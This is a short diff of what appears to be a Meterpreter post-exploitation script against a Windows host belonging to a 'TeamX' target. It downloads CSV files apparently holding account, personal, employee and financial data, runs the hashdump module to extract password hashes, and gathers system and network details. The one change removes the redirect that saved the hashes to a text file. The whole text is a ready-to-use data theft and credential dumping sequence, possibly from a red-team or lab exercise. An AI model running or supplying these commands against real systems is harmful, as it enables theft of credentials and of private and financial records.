@@ -3,7 +3,7 @@ download C:\\TeamXAccount.csv
 download C:\\TeamXPersonal.csv
 download C:\\TeamXEmployees.csv
 download C:\\TeamXFinancial.csv
-run post/windows/gather/hashdump > teamXpasswords.txt 
+run post/windows/gather/hashdump 
 sysinfo
 getuid
 ifconfig
